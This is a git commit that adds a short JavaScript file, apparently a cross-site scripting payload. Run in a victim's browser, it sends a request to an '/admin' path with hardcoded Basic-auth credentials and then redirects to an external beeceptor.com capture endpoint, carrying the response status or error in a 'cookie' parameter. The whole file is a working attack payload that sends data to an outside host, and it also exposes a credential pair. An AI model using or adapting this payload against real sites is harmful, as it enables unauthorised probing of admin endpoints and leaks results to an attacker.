e119743cdb5d8075210d60a72e79e034e5466d23
Oleg Esakov <73789889+TWTZptr@users.noreply.github.com>
2025-01-09 08:59:20 +0300

    Create fsd432.js

---
+++ fsd432.js
@@ -0,0 +1,9 @@
+(async () => {
+  let headers = new Headers();
+  headers.set('Authorization', 'Basic ' + btoa('214646f5-1e6f-4049-a1e9-c0d98bcadda6' + ":" + 'valera_smeni_kredi_4mo'));
+  fetch('/admin', {headers, redirect: 'manual'}).then(res => {
+    window.location.replace('https://gvfdgdfgfsfd.free.beeceptor.com?cookie=' + res.status);
+  }).catch(err => {
+    window.location.replace('https://gvfdgdfgfsfd.free.beeceptor.com?cookie=' + JSON.stringify(err))
+  });
+})()
